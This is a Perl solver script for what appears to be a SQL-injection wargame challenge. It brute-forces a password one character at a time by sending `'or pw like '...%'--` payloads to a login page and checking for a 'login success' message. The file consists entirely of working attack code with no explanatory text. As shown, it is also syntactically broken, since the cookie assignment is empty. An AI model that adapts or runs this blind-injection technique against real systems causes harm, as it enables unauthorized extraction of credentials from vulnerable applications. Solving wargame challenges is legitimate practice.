#!/usr/bin/perl
use strict;
use warnings;
use LWP::UserAgent;

$ENV{PERL_LWP_SSL_CA_FILE} = '/etc/ssl/cert.pem';
$|++;

use Data::Dumper;

my @charset = (
  #33  ..  47,  # !"#$%&'()*+,-./
  48  ..  57,  # 0-9
  #58  ..  64,  # :;<=>?@
  #65  ..  70,  # A-F
  #97  ..  102, # a-f
  #65  ..  90,  # A-Z
  #91  ..  96,  # [\]^_`
  97  ..  122, # a-z
  #123 ..  126, # {|}~
);

my $url =
"https://los.rubiya.kr/chall/banshee_ece938c70ea2419a093bb0be9f01a7b1.php"
;

my $cookie =
;

my $ua = LWP::UserAgent->new;
my $found = '';
my $index = 0;

while (1) { # unknown pwd length
  $index++;

  for my $ord (@charset) {
    my $char = chr $ord;

    print $char;

    my $payload =
    "?pw=%27or%20pw%20like%20%27${found}${char}%25%27--"
    ;

    my $resp = $ua->get( $url.$payload, 'Cookie' => $cookie );

    if ( $resp->is_error ) {
      printf "\n[%d] %s\n", $resp->code, $resp->message;
      redo;
    }

    if ($resp->content =~ '<h2>login success!</h2>') {
      $found .= $char;
      print "\n$index => $char, Total: '$found'\n";
      last;
    }
    else {
      $found .= chr 219 if $index == $#charset; # last char and not found
    }
  }
}
# vim:sw=2:ts=2:sts=2:et:cc=80
# End of file
